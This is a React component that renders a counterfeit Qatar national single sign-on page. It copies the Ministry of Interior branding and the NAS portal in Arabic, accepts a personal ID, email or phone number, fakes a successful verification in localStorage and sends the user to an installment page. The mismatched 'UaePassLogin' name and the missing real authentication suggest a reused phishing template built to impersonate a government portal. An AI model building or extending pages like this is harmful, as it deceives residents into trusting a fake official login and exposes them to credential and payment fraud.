import React, { useState } from "react";
import { useLocation } from "wouter";
import { Shield, Fingerprint, Lock } from "lucide-react";

export default function UaePassLogin() {
  const [, setLocation] = useLocation();
  const [rememberMe, setRememberMe] = useState(false);
  const [inputValue, setInputValue] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    localStorage.setItem("qatarPassVerified", "true");
    setLocation("/installment-en");
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#ffffff", display: "flex", flexDirection: "column", fontFamily: "'Cairo', sans-serif" }}>
      {/* Qatar Maroon Top Bar */}
      <div style={{ height: "12px", backgroundColor: "#8a1538", width: "100%" }}></div>

      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", padding: "60px 20px", backgroundColor: "#ffffff" }}>
        <div style={{ maxWidth: "500px", width: "100%" }}>
          {/* Security Icon */}
          <div style={{ textAlign: "center", marginBottom: "50px" }}>
            <div style={{ 
              width: "100px", 
              height: "100px", 
              backgroundColor: "#fdf2f2",
              borderRadius: "50%",
              display: "inline-flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#8a1538",
              boxShadow: "0 10px 25px rgba(138, 21, 56, 0.1)"
            }}>
              <Shield size={48} />
            </div>
          </div>

          {/* Title */}
          <h1 style={{ textAlign: "center", fontSize: "28px", fontWeight: "900", color: "#1a202c", marginBottom: "10px", margin: "0 0 10px 0" }}>
            الدخول الموحد - قطر
          </h1>
          <p style={{ textAlign: "center", color: "#718096", marginBottom: "40px", fontSize: "16px" }}>
            بوابة التصديق الوطني (NAS)
          </p>

          {/* Form */}
          <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: "20px" }} dir="rtl">
            {/* Input Field */}
            <div style={{ position: "relative" }}>
              <input
                type="text"
                placeholder="الرقم الشخصي، البريد الإلكتروني أو الهاتف"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                style={{
                  width: "100%",
                  padding: "18px 20px",
                  border: "2px solid #edf2f7",
                  borderRadius: "16px",
                  fontSize: "16px",
                  boxSizing: "border-box",
                  color: "#2d3748",
                  backgroundColor: "#f7fafc",
                  transition: "all 0.3s",
                  outline: "none",
                  fontWeight: "bold"
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = "#8a1538";
                  e.target.style.backgroundColor = "#ffffff";
                  e.target.style.boxShadow = "0 0 0 4px rgba(138, 21, 56, 0.05)";
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = "#edf2f7";
                  e.target.style.backgroundColor = "#f7fafc";
                  e.target.style.boxShadow = "none";
                }}
              />
            </div>

            {/* Remember Me Checkbox */}
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <input
                type="checkbox"
                id="rememberMe"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                style={{
                  width: "20px",
                  height: "20px",
                  cursor: "pointer",
                  accentColor: "#8a1538",
                }}
              />
              <label htmlFor="rememberMe" style={{ fontSize: "15px", color: "#4a5568", cursor: "pointer", fontWeight: "bold" }}>
                تذكر بياناتي
              </label>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "18px",
                backgroundColor: "#8a1538",
                color: "#ffffff",
                border: "none",
                borderRadius: "16px",
                fontSize: "18px",
                fontWeight: "900",
                cursor: "pointer",
                marginTop: "10px",
                transition: "all 0.3s",
                boxShadow: "0 10px 20px rgba(138, 21, 56, 0.2)"
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = "#7a1232";
                e.currentTarget.style.transform = "translateY(-2px)";
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = "#8a1538";
                e.currentTarget.style.transform = "translateY(0)";
              }}
            >
              تسجيل الدخول
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: "center", marginTop: "35px", fontSize: "15px" }} dir="rtl">
            <span style={{ color: "#718096" }}>ليس لديك حساب؟ </span>
            <a href="#" style={{ color: "#8a1538", textDecoration: "none", fontWeight: "900", cursor: "pointer" }}>
              إنشاء حساب جديد
            </a>
          </div>

          <div style={{ textAlign: "center", marginTop: "15px" }} dir="rtl">
            <a href="#" style={{ color: "#718096", textDecoration: "none", fontWeight: "bold", fontSize: "14px", cursor: "pointer" }}>
              نسيت كلمة المرور؟
            </a>
          </div>
        </div>
      </div>
      
      {/* Footer Logos */}
      <div style={{ padding: "40px", textAlign: "center", backgroundColor: "#f7fafc", borderTop: "1px solid #edf2f7" }}>
        <div style={{ display: "flex", justifyContent: "center", gap: "30px", opacity: 0.5 }}>
          <Lock size={24} />
          <Fingerprint size={24} />
          <Shield size={24} />
        </div>
        <p style={{ marginTop: "20px", fontSize: "12px", color: "#a0aec0", fontWeight: "bold", textTransform: "uppercase", letterSpacing: "1px" }}>
          Ministry of Interior - State of Qatar
        </p>
      </div>
    </div>
  );
}
